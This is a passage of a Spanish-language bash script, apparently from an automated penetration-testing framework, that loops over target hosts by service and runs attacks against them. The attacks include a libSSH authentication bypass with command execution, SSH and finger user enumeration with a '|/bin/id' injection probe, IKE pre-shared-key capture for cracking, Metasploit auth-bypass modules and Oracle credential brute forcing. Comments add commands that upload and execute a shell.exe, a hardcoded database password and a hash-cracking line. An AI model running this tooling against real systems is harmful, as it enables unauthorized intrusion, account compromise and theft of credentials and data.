			$proxychains libsshauthbypass.py --host $ip --port 22 --command "whoami" > logs/vulnerabilidades/"$ip"_22_SSHBypass.txt 
			
			egrep -iq "Not Vulnerable|Error" logs/vulnerabilidades/"$ip"_22_SSHBypass.txt  2>/dev/null
			greprc=$?
			if [[ $greprc -eq 1 ]] ; then
				echo "Vulnerable a libSSH bypass"  > .vulnerabilidades/"$ip"_22_SSHBypass.txt
			fi									
		fi	

		if [ "$PROXYCHAINS" == "n" ]; then 
			echo -e "\t[+] Probando vulnerabilidad CVE-2018-15473"						
			egrep -iq "is an invalid username" logs/vulnerabilidades/"$ip"_22_CVE-2018-15473.txt 2>/dev/null
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then	
				echo -e "\t[+] Realizando enumeracion de usuarios mediante la  vulnerabilidad CVE-2018-15473 en $ip"
				cat logs/vulnerabilidades/"$ip"_22_CVE-2018-15473.txt > .vulnerabilidades/"$ip"_22_CVE-2018-15473.txt 			
				$proxychains enumeracionUsuariosSSH.py -p $port -w $common_user_list  $ip | grep "is a valid" > .vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH.txt &			
			fi	
		fi  
				
		# Password por defecto
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt > .vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null					
		echo ""
 	done <servicios/ssh.txt
		
	#insert clean data	
	insert_data
fi # ssh



if [ -f servicios/finger.txt ]
then
	echo -e "$OKBLUE #################### FINGER ######################$RESET"	    
	while read line; do
		ip=`echo $line | cut -f1 -d":"`		
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"		
		$proxychains finger @$ip > logs/vulnerabilidades/"$ip"_79_usuariosSistema.txt 
		cp logs/vulnerabilidades/"$ip"_79_usuariosSistema.txt  .vulnerabilidades/"$ip"_79_usuariosSistema.txt 

		#Fast Enum #
		for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGER: $q"; $proxychains finger "$q@$ip"; echo -e "\n";done > logs/vulnerabilidades/"$ip"_79_fastEnum.txt
		cp logs/vulnerabilidades/"$ip"_79_fastEnum.txt .vulnerabilidades/"$ip"_79_fastEnum.txt
		sleep 1
					# done true				        	        				
	    #finger "|/bin/id@10.0.0.3"
		if [ "$PROXYCHAINS" == "n" ]; then 
			finger-user-enum.pl -U $common_user_list -t $ip > logs/vulnerabilidades/"$ip"_finger_enumBrute.txt
			grep ssh logs/vulnerabilidades/"$ip"_finger_enumBrute.txt > .vulnerabilidades/"$ip"_finger_enumBrute.txt
		fi  
		
	done < servicios/finger.txt	
fi


if [ -f servicios/vpn.txt ]
then
	echo -e "$OKBLUE #################### VPN (`wc -l servicios/vpn.txt`) ######################$RESET"	    
	for line in $(cat servicios/vpn.txt); do		
		ip=`echo $line | cut -f1 -d":"`		
		port=`echo $line | cut -f2 -d":"`
			
		echo -e "[+] Escaneando $ip:500"
		echo -e "\t[+] Probando si el modo agresivo esta habilitado "
		$proxychains ike=`ike-scan -M $ip 2>/dev/null`
		echo "$ike" > logs/vulnerabilidades/"$ip"_500_VPNagresivo.txt
		if [[ $ike == *"1 returned handshake"* ]]; then
			echo -e "\t$OKRED[!] Modo agresivo detectado \n $RESET"
			echo $ike > .enumeracion/"$ip"_vpn_transforms.txt
			cp .enumeracion/"$ip"_vpn_transforms.txt logs/enumeracion/"$ip"_vpn_transforms.txt					
			$proxychains ike-scan --aggressive --multiline --id=vpn --pskcrack=.vulnerabilidades/"$ip"_500_VPNhandshake.txt $ip > logs/vulnerabilidades/"$ip"_500_VPNagresivo.txt 2>/dev/null ;						
		fi			
	done
	#insert clean data	
	insert_data
fi


if [ -f servicios/vnc.txt ]
then
	echo -e "$OKBLUE #################### VNC (`wc -l servicios/vnc.txt`) ######################$RESET"	    
	for line in $(cat servicios/vnc.txt); do		
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`		
		echo -e "[+] Escaneando $ip:$port"			
		vnc_response=`echo -e "\ta" | $proxychains  nc -w 3 $ip $port`
		echo $vnc_response > logs/vulnerabilidades/"$ip"_"$port"_VNCbypass.txt 
		if [[ ${vnc_response} == *"RFB 003.008"* ]];then
			echo -e "\tVNC bypass ($vnc_response)" > .vulnerabilidades/"$ip"_"$port"_VNCbypass.txt 
		fi	
		#36932.py

		echo -e "\t[+] Verificando autenticación"
		$proxychains msfconsole -x "use auxiliary/scanner/vnc/vnc_none_auth;set RHOSTS $ip; set rport $port;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_noauth.txt 2>/dev/null		
		egrep --color=never -i "None" logs/vulnerabilidades/"$ip"_"$port"_noauth.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$ip"_"$port"_noauth.txt
		
		echo -e "\t[+] Verificando info VNC"
		echo "$proxychains  nmap -n -Pn -sT -p $port --script vnc-info,vnc-title $ip" > logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
		$proxychains nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" >> .enumeracion/"$ip"_"$port"_info.txt
		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt


		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
		echo "$proxychains  nmap -n -Pn -sT -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
		$proxychains nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" >> .vulnerabilidades/"$ip"_vnc_bypass.txt

		#vncpwd <vnc password file>

		
	done
	
	#insert clean data	
	insert_data
fi


# enumerar MS-SQL
if [ -f servicios/mssql.txt ]
then
	echo -e "$OKBLUE #################### MS-SQL (`wc -l servicios/mssql.txt`) ######################$RESET"	    
	while read line           
	do   	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo información de MS-SQL"
		echo "$proxychains  nmap -Pn -n -sV -sT -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
		$proxychains nmap -Pn -n -sV -sT -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_1434_info.txt 
					
		echo ""
 	done <servicios/mssql.txt
 		
	#insert clean data	
	#sqsh -S 10.10.10.59 -U sa -P 'GWE3V65#6KFH93@4GWTG2G'
	insert_data
fi
		

#CITRIX
if [ -f servicios/citrix.txt ]
then
	echo -e "$OKBLUE #################### citrix (`wc -l servicios/citrix.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Enumerando aplicaciones y dato del servidor"
		
		echo "$proxychains  nmap -n -sT -sU --script=citrix-enum-apps -p 1604 $ip" > logs/enumeracion/"$ip"_1604_citrixApp.txt 2>/dev/null
		echo "$proxychains  nmap -n -sT -sU --script=citrix-enum-servers -p 1604  $ip" > logs/enumeracion/"$ip"_1604_citrixServers.txt 2>/dev/null
		
		$proxychains nmap -Pn -n -sT -sU --script=citrix-enum-apps -p 1604 $ip >> logs/enumeracion/"$ip"_1604_citrixApp.txt 2>/dev/null
		$proxychains nmap -Pn -n -sT -sU --script=citrix-enum-servers -p 1604  $ip >> logs/enumeracion/"$ip"_1604_citrixServers.txt 2>/dev/null
		
		grep --color=never "|" logs/enumeracion/"$ip"_1604_citrixApp.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|filtered" > .enumeracion/"$ip"_1604_citrixApp.txt 
		grep --color=never "|" logs/enumeracion/"$ip"_1604_citrixServers.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|filtered" > .enumeracion/"$ip"_1604_citrixServers.txt 
													 
		 echo ""
 	done <servicios/citrix.txt
		
	
	#insert clean data	
	insert_data	
fi

#	dahua

if [ -f servicios/dahua_dvr.txt ]
then
	echo -e "$OKBLUE #################### DAHUA (`wc -l servicios/dahua_dvr.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`			
		echo -e "[+] Escaneando $ip:$port"								
		echo -e "\t[+] Probando vulnerabilidad de Dahua"		
		echo "$proxychains msfconsole -x 'use auxiliary/scanner/misc/dahua_dvr_auth_bypass;set RHOSTS $ip; set ACTION USER;run;exit'" >> logs/vulnerabilidades/"$ip"_37777_vulnDahua.txt 2>/dev/null
		$proxychains msfconsole -x "use auxiliary/scanner/misc/dahua_dvr_auth_bypass;set RHOSTS $ip; set ACTION USER;run;exit" >> logs/vulnerabilidades/"$ip"_37777_vulnDahua.txt 2>/dev/null
					
		egrep -iq "admin" logs/vulnerabilidades/"$ip"_37777_vulnDahua.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Dahua vulnerable \n $RESET"
			cp logs/vulnerabilidades/"$ip"_37777_vulnDahua.txt .vulnerabilidades/"$ip"_37777_vulnDahua.txt
		else
			echo -e "\t$OKGREEN[i] Dahua no vulnerable $RESET"
		fi					
															
		 echo ""
		 #./hashcat.bin -m 24900 -a 0 hash-dvr.txt /media/sistemas/Passwords/Passwords -o cracked.txt
 	done <servicios/dahua_dvr.txt		
	
	#insert clean data	
	insert_data
	
fi


#	elasticsearch

if [ -f servicios/elasticsearch.txt ]
then
	echo -e "$OKBLUE #################### Elastic search (`wc -l servicios/elasticsearch.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando enumeracion de elasticsearch"		
		echo -e "[+] Escaneando $ip:$port"	> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
		echo "$proxychains msfconsole -x 'use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit'" >> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
		$proxychains msfconsole -x "use auxiliary/scanner/elasticsearch/indices_enum;set RHOSTS $ip; run;exit" >> logs/enumeracion/"$ip"_elasticsearch_indices.txt 2>/dev/null
		grep --color=never "Indices found" logs/enumeracion/"$ip"_elasticsearch_indices.txt  > .enumeracion/"$ip"_elasticsearch_indices.txt 
	    #exploit/multi/elasticsearch/search_groovy_script 																	
		 
		#List all roles on the system:
		echo "curl -X GET $ip:$port/_security/role"  > logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null
		$proxychains curl -X GET "$ip:$port/_security/role" >> logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null

		#List all users on the system:
		$proxychains curl -X GET "$ip:$port/_security/user" >> logs/enumeracion/"$ip"_elasticsearch_enum.txt 2>/dev/null


		
 	done <servicios/elasticsearch.txt
				
	#insert clean data	
	insert_data	
fi


if [ -f servicios/juniper.txt ]
then
	echo -e "$OKBLUE #################### Juniper (`wc -l servicios/juniper.txt`)######################$RESET"	    
	while read line       
	do     			
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Enumerando juniper"		
		$proxychains juniperXML.pl -url "http://$ip:$port" > logs/enumeracion/"$ip"_"$port"_juniperHostname.txt 2>/dev/null
		cp logs/enumeracion/"$ip"_"$port"_juniperHostname.txt .enumeracion/"$ip"_"$port"_juniperHostname.txt
																		
		 echo ""
 	done <servicios/juniper.txt
				
	#insert clean data	
	insert_data	
fi



#Oracle
if [ -f servicios/oracle.txt ]
then
	echo -e "$OKBLUE #################### oracle (`wc -l servicios/oracle.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando vulnerabilidad con oscanner"				
		echo "oscanner -s $ip -P 1521" > logs/vulnerabilidades/"$ip"_"$port"_oscanner.txt 2>/dev/null
		$proxychains oscanner -s $ip -P $port -v >> logs/vulnerabilidades/"$ip"_"$port"_oscanner.txt 2>/dev/null	

		echo -e "\t[+] Probando vulnerabilidad con nmap"				
		echo "$proxychains  nmap --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
		$proxychains nmap -n -Pn --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	

		echo "$proxychains  nmap -p $port --script=oracle-sid-brute $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
		$proxychains nmap -n -Pn -p $port --script=oracle-sid-brute $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	

		echo "$proxychains  nmap -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
		$proxychains nmap -Pn -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
	
	
		echo -e "\t[+] Probando vulnerabilidad con tnscmd10g"				
		echo "tnscmd10g version -p 1521 -h $ip" > logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
		$proxychains tnscmd10g version -p 1521 -h $ip > logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null		

		echo "tnscmd10g services -p 1521 -h $ip" >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
		$proxychains tnscmd10g services -p 1521 -h $ip >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null

		echo "tnscmd10g debug -p 1521 -h $ip " >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
		$proxychains tnscmd10g debug -p 1521 -h $ip >> logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null

		cat logs/enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null > .enumeracion/"$ip"_"$port"_tnscmd10g.txt 2>/dev/null
		
		#echo -e "\t[+] Probando vulnerabilidad con odat"
		#odat.sh all -s $ip >> logs/vulnerabilidades/"$ip"_"$port"_odat.txt 2>/dev/null

		echo -e "\t[+] Probando vulnerabilidad tnspoison"
		$proxychains msfconsole -x "use auxiliary/scanner/oracle/tnspoison_checker;set RHOSTS $ip; run;exit" >> logs/vulnerabilidades/"$ip"_"$port"_tnspoison.txt 2>/dev/null
		grep "is vulnerable" logs/vulnerabilidades/"$ip"_"$port"_tnspoison.txt | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_tnspoison.txt 
		
		#odat.sh utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe /opt/hacking/10.10.16.3-443.exe --sysdba
		#odat.sh externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
			
	done <servicios/oracle.txt	
	
	#insert clean data	
	insert_data
fi

#INTEL
if [ -f servicios/intel.txt ]
then
	echo -e "$OKBLUE #################### intel (`wc -l servicios/intel.txt`) ######################$RESET"	    
	while read line       
	do     				
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"																	
		echo -e "\t[+] Probando vulnerabilidad"				
		echo "$proxychains  nmap -n -sT -p $port --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
		$proxychains nmap -Pn -n -sT -p $port --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
													 
		 echo ""
 	done <servicios/intel.txt	
	
	#insert clean data	
	insert_data
fi









if [ -f servicios/printers.txt ]
then
	echo -e "$OKBLUE #################### Printers (`wc -l servicios/printers.txt`) ######################$RESET"	    		
	echo ls >> command.txt
	echo -e "\tnvram dump" >> command.txt	
	echo quit >> command.txt
	for line in $(cat servicios/printers.txt); do
        ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Probando lectura de RAM"			
		
		echo "pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv \"\||Checking|ASCII|_|jan\" | tail -n +4" > logs/enumeracion/"$ip"_9100_PJL.txt 2>/dev/null 	
		$proxychains pret.sh --safe $ip pjl -i `pwd`/command.txt | egrep -iv "\||Checking|ASCII|_|jan" | tail -n +4 >> logs/enumeracion/"$ip"_9100_PJL.txt 2>/dev/null 	
		cp logs/enumeracion/"$ip"_9100_PJL.txt .enumeracion/"$ip"_9100_PJL.txt 
			
    done;   
    rm command.txt   
    #insert clean data	
	insert_data
    
fi	

if [ -f servicios/jenkins.txt ]
then
	echo -e "$OKBLUE #################### jenkins (`wc -l servicios/jenkins.txt`) ######################$RESET"	    		
	for line in $(cat servicios/jenkins.txt); do
        ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"				
		$proxychains web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt  &			
			
    done;       
    #insert clean data	
	insert_data
    
fi	




if [ -f servicios/web.txt ]
then
      
    echo -e "$OKBLUE #################### WEB (`wc -l servicios/web.txt`) ######################$RESET"	    
	touch webClone/checksumsEscaneados.txt
    ################ Obtener Informacion tipo de servidor, CMS, framework, etc ###########3
    echo -e "$OKGREEN[i] Identificacion de técnologia usada en los servidores web$RESET"	
	for line in $(cat servicios/web.txt); do  
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		if [ $internet == "s" ]; then 
			DOMINIO_INTERNO=$DOMINIO_EXTERNO

		fi

		
		if [ "$MODE" == "hacking" && "$hosting" == 'n' ]; then 	

			if [ $internet == "n" ]; then 
				echo -e "\t[+] Buscando domain"
				DOMINIO_INTERNO=`nmap -Pn -sV -n -p $port $ip | grep 'Host:' | awk '{print $4}'`			

				#Extraer dominio del status
				if [ -z "$DOMINIO_INTERNO" ]; then
					DOMINIO_INTERNO=`webData.pl -t $ip -p $port -s http -e todo -d / -l /dev/null -r 4 | grep 'Name or service not known' | cut -d "~" -f2`
				fi	
			fi

					
			if [[ ! -z "$DOMINIO_INTERNO" ]] ; then 

				if [ $internet == "n" ]; then 
					echo "$ip $DOMINIO_INTERNO" >> /etc/hosts
					echo "$ip,$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE		
				fi

				#base line request
				echo -e "\t[+] Buscando mas virtual hosts"
				wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomain.txt -H "Host: FUZZ.$DOMINIO_INTERNO" -u http://$DOMINIO_INTERNO -t 100 -f logs/enumeracion/baseline_http_vhosts.txt	2>/dev/null
				chars=`cat logs/enumeracion/baseline_http_vhosts.txt | grep 'C=' | awk '{print $7}'`
				echo "\tchars $chars" # no incluir las respuestas con x chars (sitios iguales)

				
				wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMINIO_INTERNO" -u http://$DOMINIO_INTERNO -t 100 --hh $chars --hc 401 -f logs/enumeracion/"$ip"_"$port"_vhosts.txt 2>/dev/null
				grep 'Ch' logs/enumeracion/"$ip"_"$port"_vhosts.txt | grep -v 'Word'  | awk '{print $9}' | tr -d '"' > .enumeracion/"$ip"_"$port"_vhosts.txt
				vhosts=`cat .enumeracion/"$ip"_"$port"_vhosts.txt`

				for vhost in $vhosts; do					
						echo -e "\t[+] Adicionando vhost $vhost a los targets"	
						echo "$ip $vhost.$DOMINIO_INTERNO" >> /etc/hosts
						echo "$ip,$vhost.$DOMINIO_INTERNO,vhost" >> $prefijo$IP_LIST_FILE					
				done
				
			fi				
		fi	

		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 			
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
				echo -e "[+] Escaneando $ip:$port"	
				echo -e "\t[+] Revisando server-status"
				curl --max-time 2 http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td>//g' | sed 's/<td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' | sed 's/amp;//g' > .enumeracion/"$ip"_"$port"_serverStatus.txt 
				echo -e "\t[+] Obteniendo informacion web"
				$proxychains webData.pl -t $ip -p $port -s http -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
				sleep 0.1;


			
				######## revisar por subdominio #######
				echo "DOMINIO_INTERNO $DOMINIO_INTERNO"
				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then # si es el archivo subdomains.csv								
					lista_subdominios=`grep --color=never $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2 | grep --color=never $DOMINIO_INTERNO| uniq` 
					echo "lista_subdominios1111 $lista_subdominios"
					for subdominio in $lista_subdominios; do										
						if [[  ${subdominio} != *"cpanel."* && ${subdominio} != *"cpcalendars."* && ${subdominio} != *"cpcontacts."*  && ${subdominio} != *"ftp."* && ${subdominio} != *"webdisk."* && ${subdominio} != *"webmail."* && ${subdominio} != *"autodiscover."* && ${subdominio} != *"whm."* ]];then 
							echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
							# Una sola rediccion (-r 1) para evitar que escaneemos 2 veces el mismo sitio
							$proxychains webData.pl -t $subdominio -p $port -s http -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 1 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 						
						fi
						
					done
				fi
				###############################
				break												
			else				
				perl_instancias=`ps aux | grep perl | grep -v grep | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb "
				sleep 3									
			fi		
		done # while true		
	done # for
		
	 ######## wait to finish web info ########
	  while true; do
		perl_instancias=$((`ps aux | grep webData | wc -l` - 1)) 
		if [ "$perl_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de perl activos ($perl_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	###########################################################

  # Web buster & clone
   echo -e ""
   echo -e "$OKGREEN\n[i] Realizando la navegacion forzada $RESET"
	for line in $(cat servicios/web.txt); do    
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`				
		echo -e "[+] Escaneando $ip:$port"
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 
			#if [[ $free_ram -gt $min_ram && $perl_instancias -lt 10  ]];then 
			if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
			#echo "FILE $prefijo$IP_LIST_FILE"			
				#################  Realizar el escaneo por dominio  ##############	
				echo "FILEEE: $prefijo$IP_LIST_FILE DOMINIO_INTERNO $DOMINIO_INTERNO"			
				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then					
					lista_subdominios=`grep --color=never $ip $prefijo$IP_LIST_FILE | egrep 'subdomain|vhost'| cut -d "," -f2 | grep --color=never $DOMINIO_INTERNO| uniq` 
					echo "lista_subdominios $lista_subdominios"					
						for subdominio in $lista_subdominios; do													
							if [[  ${subdominio} != *"cpanel."* && ${subdominio} != *"cpcalendars."* && ${subdominio} != *"cpcontacts."*  && ${subdominio} != *"ftp."* && ${subdominio} != *"webdisk."* && ${subdominio} != *"webmail."* && ${subdominio} != *"autodiscover."* && ${subdominio} != *"whm."* ]];then 
								echo -e "\t[+] subdominio: $subdominio"							
								#wget --timeout=20 --tries=1 http://$subdominio -O webClone/http-$subdominio.html

								$proxychains curl.pl --url  http://$subdominio > webClone/http-$subdominio.html												
			
								sed -i "s/\/index.php//g" webClone/http-$subdominio.html
								sed -i "s/https/http/g" webClone/http-$subdominio.html						
								sed -i "s/www.//g" webClone/http-$subdominio.html	
								
								#Borrar lineas que cambian en cada peticion
								egrep -v "lae-portfolio-header|script|visitas|contador" webClone/http-$subdominio.html > webClone/http2-$subdominio.html
								mv webClone/http2-$subdominio.html webClone/http-$subdominio.html
																																				
								checksumline=`md5sum webClone/http-$subdominio.html` 							
								md5=`echo $checksumline | awk {'print $1'}` 													
								egrep -iq $md5 webClone/checksumsEscaneados.txt
								noEscaneado=$?
								
								egrep -iq "no Route matched with those values" webClone/http-$subdominio.html
								greprc=$?
								if [[ $greprc -eq 0  ]];then 
									noEscaneado=1
								fi	
								
								egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|GoAhead-Webs" .enumeracion/"$subdominio"_"$port"_webData.txt
								hostOK=$?	
								echo -e "\t\t hostOK $hostOK"
								
								egrep -qi "403" .enumeracion/"$subdominio"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
								accesoDenegado=$?	
								
								
								# 1= no coincide (no redirecciona a otro dominio o es error de proxy)			
								echo -e "\t\t[+]noEscaneado $noEscaneado hostOK $hostOK accesoDenegado $accesoDenegado (0=acceso negado)"
								#noEscaneado 1 hostOK 0 accesoDenegado 1 (0=acceso negado)
								if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
									echo "\t[+] Realizando tests adicionales "
									echo $checksumline >> webClone/checksumsEscaneados.txt
								
									if [[ $internet == "s" && "$MODE" == "assessment" ]]; then
										echo -e "\t[+] identificar si el host esta protegido por un WAF "
										wafw00f http://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
										grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								

										echo -e "\t\t[+] Detectando si hay balanceador de carga"							
